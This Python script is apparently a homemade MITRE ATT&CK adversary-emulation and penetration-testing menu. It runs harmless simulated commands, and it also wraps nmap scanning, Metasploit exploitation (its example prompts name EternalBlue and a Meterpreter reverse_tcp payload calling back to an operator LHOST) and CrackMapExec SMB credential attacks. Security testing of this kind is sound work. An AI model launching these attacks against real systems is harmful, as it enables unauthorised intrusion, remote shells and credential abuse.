######################################################################################################################################################################################################################
# Python adversary emulator script, in line with the MITRE ATT&CK Framerwork. Ensuring apt_groups.json is in the same directory as the script. sudo python3 mitre_att&ck.py. Requires a linux virtual environment. 
# Performs simulations or real world attacks based on selections. Note: Will be adding options for real world penatration test attack selection, that will attempt to exploit discovered vulnerabilities based on logic. 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

import json
import time
import datetime
import subprocess
import os
import shutil

   
# Disclaimer and Ethical Guidelines
def display_disclaimer():
    print("""
    DISCLAIMER:
    This script is intended for educational purposes only. It is not intended to cause any harm or damage.
    You must have explicit permission from the owner of any system you target with this script.
    Unauthorized testing and exploitation of systems is illegal and unethical.
    Always ensure you have written consent before conducting any security testing.
    """)

# Banner
def print_banner():
    banner = r"""
    
 _____  .___________________________________         _______________________________  _________   ____  __.     ___________                                                  __    
  /     \ |   \__    ___/\______   \_   _____/        /  _  \__    ___/\__    ___/  _ \ \_   ___ \ |    |/ _|     \_   _____/____________     _____   ______  _  _____________|  | __
 /  \ /  \|   | |    |    |       _/|    __)_        /  /_\  \|    |     |    |  >  _ </|    \  \/ |      <        |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /
/    Y    \   | |    |    |    |   \|        \      /    |    \    |     |    | /  <_\ \|     \____|    |  \       |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    < 
\____|__  /___| |____|    |____|_  /_______  /______\____|__  /____|     |____| \_____\ \\______  /|____|__ \______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \
        \/                       \/        \//_____/        \/                         \/       \/         \/_____/    \/                \/       \/     \/                        \/
        
       MITRE ATT&CK Simulation & Penetration Testing Framework
    """
    print(banner)

# Load APT group data from JSON file
def load_apt_groups(filename="apt_groups.json"):
    try:
        with open(filename, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        print(f"[ERROR] {filename} not found. Please ensure the file exists in the same directory.")
        exit()

# Function to install missing tools
def check_and_install_tools(tools):
    for tool in tools:
        if shutil.which(tool) is None:
            print(f"[INFO] {tool} not found. Attempting to install...")
            subprocess.run(["sudo", "apt-get", "install", "-y", tool], check=True)
        else:
            print(f"[INFO] {tool} is already installed.")

# Function to log alerts
def log_alert(apt_name, technique):
    alert = {
        "timestamp": datetime.datetime.now().isoformat(),
        "apt_name": apt_name,
        "technique_id": technique["id"],
        "technique_name": technique["name"],
        "tactic": technique["tactic"],
        "description": technique["description"]
    }
    with open("alerts_log.json", "a") as log_file:
        log_file.write(json.dumps(alert) + "\n")
    print(f"[ALERT] Logged alert for {technique['name']} ({technique['id']})")

# Simulate attack techniques
def simulate_technique(apt_name, technique):
    print(f"[INFO] Simulating {technique['name']} ({technique['id']}) for {apt_name}...")
    if technique["id"] == "T1071":  # Example technique: HTTP requests
        simulate_http_requests()
    elif technique["id"] == "T1059":  # Example technique: Command execution
        simulate_command_execution()
    else:
        simulate_generic_activity()
    log_alert(apt_name, technique)

# Simulated Techniques
def simulate_http_requests():
    endpoints = ["http://example.com", "http://example.org", "http://example.net"]
    for endpoint in endpoints:
        subprocess.run(["curl", endpoint])
        time.sleep(1)

def simulate_command_execution():
    commands = ["ls", "whoami", "uname -a"]
    for cmd in commands:
        subprocess.run(cmd, shell=True)
        time.sleep(1)

def simulate_generic_activity():
    print("[INFO] Simulating generic APT activity...")
    time.sleep(2)

# Penetration Testing Menu
def penetration_testing_menu():
    while True:
        print("\nPenetration Testing Options:")
        print("1. Nmap Scanning")
        print("2. Exploitation (Metasploit)")
        print("3. Credential Dumping (CrackMapExec)")
        print("4. Return to Main Menu")
        choice = input("Select an option: ")

        if choice == "1":
            nmap_scanning()
        elif choice == "2":
            metasploit_exploitation()
        elif choice == "3":
            crackmapexec_dumping()
        elif choice == "4":
            break
        else:
            print("[ERROR] Invalid option. Please try again.")

# Nmap Scanning Function
def nmap_scanning():
    target = input("[INPUT] Enter target IP or subnet (e.g., 192.168.1.0/24): ")
    print(f"[INFO] Running Nmap scan on {target}...")
    subprocess.run(["nmap", "-sV", target])
    print("[INFO] Nmap scan completed.")

# Metasploit Exploitation Function
def metasploit_exploitation():
    target = input("[INPUT] Enter target IP: ")
    exploit = input("[INPUT] Enter exploit module (e.g., exploit/windows/smb/ms17_010_eternalblue): ")
    payload = input("[INPUT] Enter payload (e.g., windows/meterpreter/reverse_tcp): ")
    lhost = input("[INPUT] Enter LHOST (your IP): ")
    lport = input("[INPUT] Enter LPORT (e.g., 4444): ")

    print("[INFO] Launching Metasploit...")
    msf_commands = f"""
    use {exploit}
    set RHOSTS {target}
    set PAYLOAD {payload}
    set LHOST {lhost}
    set LPORT {lport}
    exploit
    """
    subprocess.run(["msfconsole", "-q", "-x", msf_commands])

# CrackMapExec Credential Dumping
def crackmapexec_dumping():
    target = input("[INPUT] Enter target subnet (e.g., 192.168.1.0/24): ")
    username = input("[INPUT] Enter username: ")
    password = input("[INPUT] Enter password: ")

    print(f"[INFO] Running CrackMapExec on {target}...")
    subprocess.run(["crackmapexec", "smb", target, "-u", username, "-p", password])

# Main Function
def main():
    display_disclaimer()
    print_banner()

    # Check and install required tools
    required_tools = ["nmap", "msfconsole", "crackmapexec", "curl"]
    check_and_install_tools(required_tools)

    # Load APT groups
    apt_groups = load_apt_groups()
    print("[INFO] APT Groups loaded.")

    while True:
        print("\nMain Menu:")
        print("1. Simulate APT Techniques")
        print("2. Penetration Testing")
        print("3. Exit")
        choice = input("Select an option: ")

        if choice == "1":
            for apt_name, apt_details in apt_groups.items():
                print(f"\n[INFO] {apt_name}: {apt_details['description']}")
                for technique in apt_details["techniques"]:
                    simulate_technique(apt_name, technique)
        elif choice == "2":
            penetration_testing_menu()
        elif choice == "3":
            print("[INFO] Exiting framework. Goodbye!")
            break
        else:
            print("[ERROR] Invalid option. Please try again.")

if __name__ == "__main__":
    main()
